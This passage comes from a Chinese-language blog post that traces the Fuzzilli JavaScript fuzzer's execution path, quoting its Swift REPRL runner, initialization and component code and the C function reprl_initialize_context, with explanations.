class="hljs-operator">??</span> config.timeout)<br>    dispatchEvent(events.<span class="hljs-type">PostExecute</span>, data: execution)<br><br>    <span class="hljs-keyword">return</span> execution<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="执行Fuzz–REPRL-swift"><a href="#执行Fuzz–REPRL-swift" class="headerlink" title="执行Fuzz–REPRL.swift"></a>执行Fuzz–REPRL.swift</h3><p>这里主要逻辑就是调用<code>reprl_execute</code>来执行，然后根据status来进行初步的操作。这里可能要注意下<code>reprlContext</code>，后面要用到。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">public</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">run</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">script</span>: <span class="hljs-type">String</span>, <span class="hljs-params">withTimeout</span> <span class="hljs-params">timeout</span>: <span class="hljs-type">UInt32</span>) -&gt; <span class="hljs-type">Execution</span> &#123;<br>    <span class="hljs-comment">// Log the current script into the buffer if diagnostics are enabled.</span><br>    <span class="hljs-keyword">if</span> fuzzer.config.enableDiagnostics &#123;<br>        <span class="hljs-keyword">self</span>.scriptBuffer <span class="hljs-operator">+=</span> script <span class="hljs-operator">+</span> <span class="hljs-string">&quot;<span class="hljs-subst">\n</span>&quot;</span><br>    &#125;<br><br>    lastExecId <span class="hljs-operator">+=</span> <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">let</span> execution <span class="hljs-operator">=</span> <span class="hljs-type">REPRLExecution</span>(from: <span class="hljs-keyword">self</span>)<br><br>    <span class="hljs-keyword">guard</span> script.count <span class="hljs-operator">&lt;=</span> <span class="hljs-type">REPRL_MAX_DATA_SIZE</span> <span class="hljs-keyword">else</span> &#123;<br>        logger.error(<span class="hljs-string">&quot;Script too large to execute. Assuming timeout...&quot;</span>)<br>        execution.outcome <span class="hljs-operator">=</span> .timedOut<br>        <span class="hljs-keyword">return</span> execution<br>    &#125;<br><br>    execsSinceReset <span class="hljs-operator">+=</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">var</span> freshInstance: <span class="hljs-type">Int32</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span><br>    <span class="hljs-keyword">if</span> execsSinceReset <span class="hljs-operator">&gt;</span> maxExecsBeforeRespawn &#123;<br>        freshInstance <span class="hljs-operator">=</span> <span class="hljs-number">1</span><br>        execsSinceReset <span class="hljs-operator">=</span> <span class="hljs-number">0</span><br>        <span class="hljs-keyword">if</span> fuzzer.config.enableDiagnostics &#123;<br>            scriptBuffer.removeAll(keepingCapacity: <span class="hljs-literal">true</span>)<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">var</span> execTime: <span class="hljs-type">UInt64</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>        <span class="hljs-comment">// In microseconds</span><br>    <span class="hljs-keyword">let</span> timeout <span class="hljs-operator">=</span> <span class="hljs-type">UInt64</span>(timeout) <span class="hljs-operator">*</span> <span class="hljs-number">1000</span>        <span class="hljs-comment">// In microseconds</span><br>    <span class="hljs-keyword">var</span> status: <span class="hljs-type">Int32</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span><br>    script.withCString &#123;<br>        status <span class="hljs-operator">=</span> reprl_execute(reprlContext, <span class="hljs-variable">$0</span>, <span class="hljs-type">UInt64</span>(script.count), <span class="hljs-type">UInt64</span>(timeout), <span class="hljs-operator">&amp;</span>execTime, freshInstance)<br>        <span class="hljs-comment">// If we fail, we retry after a short timeout and with a fresh instance. If we still fail, we give up trying</span><br>        <span class="hljs-comment">// to execute this program. If we repeatedly fail to execute any program, we abort.</span><br>        <span class="hljs-keyword">if</span> status <span class="hljs-operator">&lt;</span> <span class="hljs-number">0</span> &#123;<br>            logger.warning(<span class="hljs-string">&quot;Script execution failed: <span class="hljs-subst">\(String(cString: reprl_get_last_error(reprlContext)))</span>. Retrying in 1 second...&quot;</span>)<br>            <span class="hljs-keyword">if</span> fuzzer.config.enableDiagnostics &#123;<br>                fuzzer.dispatchEvent(fuzzer.events.<span class="hljs-type">DiagnosticsEvent</span>, data: (name: <span class="hljs-string">&quot;REPRLFail&quot;</span>, content: scriptBuffer))<br>            &#125;<br>            <span class="hljs-type">Thread</span>.sleep(forTimeInterval: <span class="hljs-number">1</span>)<br>            status <span class="hljs-operator">=</span> reprl_execute(reprlContext, <span class="hljs-variable">$0</span>, <span class="hljs-type">UInt64</span>(script.count), <span class="hljs-type">UInt64</span>(timeout), <span class="hljs-operator">&amp;</span>execTime, <span class="hljs-number">1</span>)<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> status <span class="hljs-operator">&lt;</span> <span class="hljs-number">0</span> &#123;<br>        logger.error(<span class="hljs-string">&quot;Script execution failed again: <span class="hljs-subst">\(String(cString: reprl_get_last_error(reprlContext)))</span>. Giving up&quot;</span>)<br>        <span class="hljs-comment">// If we weren&#x27;t able to successfully execute a script in the last N attempts, abort now...</span><br>        recentlyFailedExecutions <span class="hljs-operator">+=</span> <span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> recentlyFailedExecutions <span class="hljs-operator">&gt;=</span> <span class="hljs-number">10</span> &#123;<br>            logger.fatal(<span class="hljs-string">&quot;Too many consecutive REPRL failures&quot;</span>)<br>        &#125;<br>        execution.outcome <span class="hljs-operator">=</span> .failed(<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">return</span> execution<br>    &#125;<br>    recentlyFailedExecutions <span class="hljs-operator">=</span> <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-type">RIFEXITED</span>(status) <span class="hljs-operator">!=</span> <span class="hljs-number">0</span> &#123;<br>        <span class="hljs-keyword">let</span> code <span class="hljs-operator">=</span> <span class="hljs-type">REXITSTATUS</span>(status)<br>        <span class="hljs-keyword">if</span> code <span class="hljs-operator">==</span> <span class="hljs-number">0</span> &#123;<br>            execution.outcome <span class="hljs-operator">=</span> .succeeded<br>        &#125; <span class="hljs-keyword">else</span> <br>            execution.outcome <span class="hljs-operator">=</span> .failed(<span class="hljs-type">Int</span>(code))<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> <span class="hljs-type">RIFSIGNALED</span>(status) <span class="hljs-operator">!=</span> <span class="hljs-number">0</span> &#123;<br>        execution.outcome <span class="hljs-operator">=</span> .crashed(<span class="hljs-type">Int</span>(<span class="hljs-type">RTERMSIG</span>(status)))<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> <span class="hljs-type">RIFTIMEDOUT</span>(status) <span class="hljs-operator">!=</span> <span class="hljs-number">0</span> &#123;<br>        execution.outcome <span class="hljs-operator">=</span> .timedOut<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">fatalError</span>(<span class="hljs-string">&quot;Unknown REPRL exit status <span class="hljs-subst">\(status)</span>&quot;</span>)<br>    &#125;<br>    execution.execTime <span class="hljs-operator">=</span> <span class="hljs-type">Double</span>(execTime) <span class="hljs-operator">/</span> <span class="hljs-number">1_000_000</span><br><br>    <span class="hljs-keyword">return</span> execution<br>&#125;<br></code></pre></td></tr></table></figure><p><code>reprl_execute</code>使用C语言实现的</p><h3 id="执行Fuzz–libreprl-posix-c"><a href="#执行Fuzz–libreprl-posix-c" class="headerlink" title="执行Fuzz–libreprl-posix.c"></a>执行Fuzz–libreprl-posix.c</h3><p>在看下面<code>reprl_execute</code>之前，先看下上面reprlContext经历了哪些过程最后传进<code>reprl_execute</code>里面：</p><h4 id="reprlContext–main-swift"><a href="#reprlContext–main-swift" class="headerlink" title="reprlContext–main.swift"></a>reprlContext–main.swift</h4><p>在这个文件中<code>fuzzer.sync</code>部分包含了下面的代码，主要关注<code>fuzzer.initialize()</code></p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-comment">// Initialize the fuzzer, and run startup tests</span><br>fuzzer.initialize()<br>fuzzer.runStartupTests()<br></code></pre></td></tr></table></figure><h4 id="reprlContext–Fuzzer-swift"><a href="#reprlContext–Fuzzer-swift" class="headerlink" title="reprlContext–Fuzzer.swift"></a>reprlContext–Fuzzer.swift</h4><p>主要关注Fuzzer的initialize函数调用了<code>runner.initialize(Fuzzer)</code>函数</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-comment">/// Initializes this fuzzer.</span><br><span class="hljs-comment">///</span><br><span class="hljs-comment">/// This will initialize all components and modules, causing event listeners to be registerd,</span><br><span class="hljs-comment">/// timers to be scheduled, communication channels to be established, etc. After initialization,</span><br><span class="hljs-comment">/// task may already be scheduled on this fuzzer&#x27;s dispatch queue.</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">initialize</span>() &#123;<br>    dispatchPrecondition(condition: .onQueue(queue))<br>    <span class="hljs-built_in">assert</span>(<span class="hljs-operator">!</span>isInitialized)<br><br>    <span class="hljs-comment">// Initialize the script runner first so we are able to execute programs.</span><br>    runner.initialize(with: <span class="hljs-keyword">self</span>)<br><br>    <span class="hljs-comment">// Then initialize all components.</span><br>    engine.initialize(with: <span class="hljs-keyword">self</span>)<br>    evaluator.initialize(with: <span class="hljs-keyword">self</span>)<br>    environment.initialize(with: <span class="hljs-keyword">self</span>)<br>    corpus.initialize(with: <span class="hljs-keyword">self</span>)<br>    minimizer.initialize(with: <span class="hljs-keyword">self</span>)<br><br>    <span class="hljs-comment">// Finally initialize all modules.</span><br>    <span class="hljs-keyword">for</span> module <span class="hljs-keyword">in</span> modules.values &#123;<br>        module.initialize(with: <span class="hljs-keyword">self</span>)<br>    &#125;<br><br>    <span class="hljs-comment">// Install a watchdog to monitor utilization instances.</span><br>    <span class="hljs-keyword">var</span> lastCheck <span class="hljs-operator">=</span> <span class="hljs-type">Date</span>()<br>    timers.scheduleTask(every: <span class="hljs-number">1</span> <span class="hljs-operator">*</span> <span class="hljs-type">Minutes</span>) &#123;<br>        <span class="hljs-comment">// Monitor responsiveness</span><br>        <span class="hljs-keyword">let</span> now <span class="hljs-operator">=</span> <span class="hljs-type">Date</span>()<br>        <span class="hljs-keyword">let</span> interval <span class="hljs-operator">=</span> now.timeIntervalSince(lastCheck)<br>        lastCheck <span class="hljs-operator">=</span> now<br>        <span class="hljs-comment">// Currently, minimization can take a very long time (up to a few minutes on slow CPUs for</span><br>        <span class="hljs-comment">// big samples). As such, the fuzzer would quickly be regarded as unresponsive by this metric.</span><br>        <span class="hljs-comment">// Ideally, it would be possible to split minimization into multiple smaller tasks or otherwise</span><br>        <span class="hljs-comment">// reduce its impact on the responsiveness of the fuzzer. But for now we just use a very large</span><br>        <span class="hljs-comment">// tolerance interval here...</span><br>        <span class="hljs-keyword">if</span> interval <span class="hljs-operator">&gt;</span> <span class="hljs-number">180</span> &#123;<br>            <span class="hljs-keyword">self</span>.logger.warning(<span class="hljs-string">&quot;Fuzzer appears unresponsive (watchdog only triggered after <span class="hljs-subst">\(Int(interval))</span>s instead of 60s).&quot;</span>)<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// Schedule a timer to print mutator statistics. TODO this should probably all move into the Statistics module, e.g. by adding a |producer| member to the relevant events so the stats can be accumulated.</span><br>    <span class="hljs-keyword">if</span> config.logLevel.isAtLeast(.info) &#123;<br>        timers.scheduleTask(every: <span class="hljs-number">15</span> <span class="hljs-operator">*</span> <span class="hljs-type">Minutes</span>) &#123;<br>            <span class="hljs-keyword">let</span> stats <span class="hljs-operator">=</span> <span class="hljs-keyword">self</span>.mutators.map(&#123; <span class="hljs-string">&quot;    <span class="hljs-subst">\(<span class="hljs-variable">$0</span>.name)</span>: Correctness rate: <span class="hljs-subst">\(String(format: <span class="hljs-string">&quot;%.2f%%&quot;</span>, <span class="hljs-variable">$0</span>.stats.correctnessRate <span class="hljs-operator">*</span> <span class="hljs-number">100</span>))</span>, Failure rate: <span class="hljs-subst">\(String(format: <span class="hljs-string">&quot;%.2f%%&quot;</span>, <span class="hljs-variable">$0</span>.stats.failureRate <span class="hljs-operator">*</span> <span class="hljs-number">100</span>))</span>, Avg. # of instructions added: <span class="hljs-subst">\(String(format: <span class="hljs-string">&quot;%.2f%&quot;</span>, <span class="hljs-variable">$0</span>.stats.avgNumberOfInstructionsGenerated))</span>&quot;</span> &#125;).joined(separator: <span class="hljs-string">&quot;<span class="hljs-subst">\n</span>&quot;</span>)<br>            <span class="hljs-keyword">self</span>.logger.info(<span class="hljs-string">&quot;Mutator statistics:<span class="hljs-subst">\n</span><span class="hljs-subst">\(stats)</span>&quot;</span>)<br>        &#125;<br>    &#125;<br><br>    dispatchEvent(events.<span class="hljs-type">Initialized</span>)<br>    logger.info(<span class="hljs-string">&quot;Initialized&quot;</span>)<br>    isInitialized <span class="hljs-operator">=</span> <span class="hljs-literal">true</span><br>&#125;<br></code></pre></td></tr></table></figure><p>由于<code>runner</code>为<code>REPRL</code>，所以下面看下<code>REPRL</code>相关的代码：</p><h4 id="reprlContext–REPRL-swift"><a href="#reprlContext–REPRL-swift" class="headerlink" title="reprlContext–REPRL.swift"></a>reprlContext–REPRL.swift</h4><p><code>REPRL</code>的父类是<code>ComponentBase</code>，对于<code>REPRL</code>的<code>initialize(Fuzzer)</code>还是从父类中继承而来，父类中的initialize()函数等待子类进行重写，如下：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">public</span> <span class="hljs-keyword">protocol</span> <span class="hljs-title class_">Component</span> &#123;<br>    <span class="hljs-keyword">func</span> <span class="hljs-title function_">initialize</span>(<span class="hljs-params">with</span> <span class="hljs-params">fuzzer</span>: <span class="hljs-type">Fuzzer</span>)<br><br>    <span class="hljs-keyword">var</span> isInitialized: <span class="hljs-type">Bool</span> &#123; <span class="hljs-keyword">get</span> &#125;<br>&#125;<br><br><span class="hljs-comment">/// Superclass for components.</span><br><span class="hljs-comment">/// Provides child classes with access to the associated fuzzer instance and a logger instance.</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ComponentBase</span>: <span class="hljs-title class_">Component</span> &#123;<br>    <span class="hljs-comment">// Name of this component.</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">let</span> name: <span class="hljs-type">String</span><br><br>    <span class="hljs-comment">// Reference to the fuzzer instance that this component is associated with.</span><br>    <span class="hljs-keyword">weak</span> <span class="hljs-keyword">var</span> fuzzer: <span class="hljs-type">Fuzzer</span>!<br><br>    <span class="hljs-comment">// Logger for this component.</span><br>    <span class="hljs-keyword">let</span> logger: <span class="hljs-type">Logger</span><br><br>    <span class="hljs-comment">// Has this component been initialized and is thus associated with a fuzzer instance?</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">var</span> isInitialized: <span class="hljs-type">Bool</span> &#123;<br>        <span class="hljs-keyword">return</span> fuzzer <span class="hljs-operator">!=</span> <span class="hljs-literal">nil</span><br>    &#125;<br><br>    <span class="hljs-keyword">init</span>(<span class="hljs-params">name</span>: <span class="hljs-type">String</span>) &#123;<br>        <span class="hljs-keyword">self</span>.name <span class="hljs-operator">=</span> name<br>        <span class="hljs-keyword">self</span>.logger <span class="hljs-operator">=</span> <span class="hljs-type">Logger</span>(withLabel: name)<br>    &#125;<br><br>    <span class="hljs-comment">// Called during initialization of the fuzzer. This associates the component with the fuzzer.</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">initialize</span>(<span class="hljs-params">with</span> <span class="hljs-params">fuzzer</span>: <span class="hljs-type">Fuzzer</span>) &#123;<br>        <span class="hljs-built_in">assert</span>(<span class="hljs-operator">!</span>isInitialized)<br>        <span class="hljs-keyword">self</span>.fuzzer <span class="hljs-operator">=</span> fuzzer<br>        initialize()<br>    &#125;<br><br>    <span class="hljs-comment">// Will be called after the fuzzer is initialized and able to execute programs.</span><br>    <span class="hljs-comment">// This is a good time to install event handlers, execute programs for setup, etc.</span><br>    <span class="hljs-keyword">func</span> <span class="hljs-title function_">initialize</span>() &#123;<br>        <span class="hljs-comment">// To be implemented by child classes.</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>下面是<code>REPRL</code>中重写的<code>initialize()</code>函数，<code>initialize(Fuzzer)</code>是从父类继承而来，所以最终会执行到下面的函数：</p><p>主要是argv和envp，下面接着跟踪一下</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">override</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">initialize</span>() &#123;<br>    reprlContext <span class="hljs-operator">=</span> libreprl.reprl_create_context()<br>    <span class="hljs-keyword">if</span> reprlContext <span class="hljs-operator">==</span> <span class="hljs-literal">nil</span> &#123;<br>        logger.fatal(<span class="hljs-string">&quot;Failed to create REPRL context&quot;</span>)<br>    &#125;<br><br>    <span class="hljs-keyword">let</span> argv <span class="hljs-operator">=</span> convertToCArray(processArguments)<br>    <span class="hljs-keyword">let</span> envp <span class="hljs-operator">=</span> convertToCArray(env)<br><br>    <span class="hljs-keyword">if</span> reprl_initialize_context(reprlContext, argv, envp, <span class="hljs-comment">/* capture stdout */</span> <span class="hljs-number">1</span>, <span class="hljs-comment">/* capture stderr: */</span> <span class="hljs-number">1</span>) <span class="hljs-operator">!=</span> <span class="hljs-number">0</span> &#123;<br>        logger.fatal(<span class="hljs-string">&quot;Failed to initialize REPRL context: <span class="hljs-subst">\(String(cString: reprl_get_last_error(reprlContext)))</span>&quot;</span>)<br>    &#125;<br><br>    freeCArray(argv, numElems: processArguments.count)<br>    freeCArray(envp, numElems: env.count)<br><br>    fuzzer.registerEventListener(for: fuzzer.events.<span class="hljs-type">Shutdown</span>) &#123; <span class="hljs-keyword">_</span> <span class="hljs-keyword">in</span><br>        reprl_destroy_context(<span class="hljs-keyword">self</span>.reprlContext)<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="argv–main-swift"><a href="#argv–main-swift" class="headerlink" title="argv–main.swift"></a>argv–main.swift</h5><p>在<code>makeFuzzer</code>函数中向<code>REPRL</code>的构造函数传入了以下参数：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">func</span> <span class="hljs-title function_">makeFuzzer</span>(<span class="hljs-params">for</span> <span class="hljs-params">profile</span>: <span class="hljs-type">Profile</span>, <span class="hljs-params">with</span> <span class="hljs-params">configuration</span>: <span class="hljs-type">Configuration</span>) -&gt; <span class="hljs-type">Fuzzer</span> &#123;<br>    <span class="hljs-comment">// A script runner to execute JavaScript code in an instrumented JS engine.</span><br>    <span class="hljs-keyword">let</span> runner <span class="hljs-operator">=</span> <span class="hljs-type">REPRL</span>(executable: jsShellPath, processArguments: profile.getProcessArguments(randomizingArguments), processEnvironment: profile.processEnv)<br></code></pre></td></tr></table></figure><h5 id="argv–REPRL-swift"><a href="#argv–REPRL-swift" class="headerlink" title="argv–REPRL.swift"></a>argv–REPRL.swift</h5><p>可以看到<code>processArguments</code>是<code>jsShellPath + 从profile中获取的参数</code>，<code>env</code>即<code>processEnvironment</code>是直接从<code>profile</code>中获得的。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">public</span> <span class="hljs-keyword">init</span>(<span class="hljs-params">executable</span>: <span class="hljs-type">String</span>, <span class="hljs-params">processArguments</span>: [<span class="hljs-type">String</span>], <span class="hljs-params">processEnvironment</span>: [<span class="hljs-params">String</span>: <span class="hljs-type">String</span>]) &#123;<br>    <span class="hljs-keyword">self</span>.processArguments <span class="hljs-operator">=</span> [executable] <span class="hljs-operator">+</span> processArguments<br>    <span class="hljs-keyword">super</span>.<span class="hljs-keyword">init</span>(name: <span class="hljs-string">&quot;REPRL&quot;</span>)<br><br>    <span class="hljs-keyword">for</span> (key, value) <span class="hljs-keyword">in</span> processEnvironment &#123;<br>        env.append(key <span class="hljs-operator">+</span> <span class="hljs-string">&quot;=&quot;</span> <span class="hljs-operator">+</span> value)<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="reprlContext–libreprl-posix-c"><a href="#reprlContext–libreprl-posix-c" class="headerlink" title="reprlContext–libreprl-posix.c"></a>reprlContext–libreprl-posix.c</h4><p>最终是将<code>argv</code>和<code>env</code>传进下面的函数进行初始化<code>ctx</code>，比如<code>ctx-&gt;argv = copy_string_array(argv)</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> <span class="hljs-title function_">reprl_initialize_context</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> reprl_context* ctx, <span class="hljs-type">const</span> <span class="hljs-type">char</span>** argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span>** envp, <span class="hljs-type">int</span> capture_stdout, <span class="hljs-type">int</span> capture_stderr)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (ctx-&gt;initialized) &#123;<br>        <span class="hljs-keyword">return</span> reprl_error(ctx, <span class="hljs-string">&quot;Context is already initialized&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-comment">// We need to ignore SIGPIPE since we could end up writing to a pipe after our child process has exited.</span><br>    signal(SIGPIPE, SIG_IGN);<br><br>    ctx-&gt;argv = copy_string_array(argv);<br>    ctx-&gt;envp = copy_string_array(envp);<br>    <br>    ctx-&gt;data_in = reprl_create_data_channel(ctx);<br>    ctx-&gt;data_out = reprl_create_data_channel(ctx);<br>    <span class="hljs-keyword">if</span> (capture_stdout) &#123;<br>        ctx-&gt;child_stdout = reprl_create_data_channel(ctx);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (capture_stderr) &#123;<br>        ctx-&gt;child_stderr = reprl_create_data_channel(ctx);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!ctx-&gt;data_in || !ctx-&gt;data_out || (capture_stdout &amp;&amp; !ctx-&gt;child_stdout) || (capture_stderr &amp;&amp; !ctx-&gt;child_stderr)) &#123;<br>        <span class="hljs-comment">// Proper error message will have been set by reprl_create_data_channel</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <br>    ctx-&gt;initialized = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="回归正题"><a href="#回归正题" class="headerlink" title="回归正题"></a>回归正题</h4><p>上面看到了一个<code>reprl_context</code>的初始化过程，当下面执行的时候会判断是否进行初始化。初始时，<code>ctx中的pid</code>还没有指向任何进程，所以第一次使用时会调用<code>reprl_spawn_child(ctx)</code>来创建一个：</p><p>看下主要逻辑，首先利用<code>vfork/fork</code>函数来很创建一个子进程，子进程中利用<code>execve</code>来执行<code>ctx-&gt;argv[0]</code>，通过上面分析就是<code>jsShellPath</code>，即子进程用来执行<code>jsShell</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span 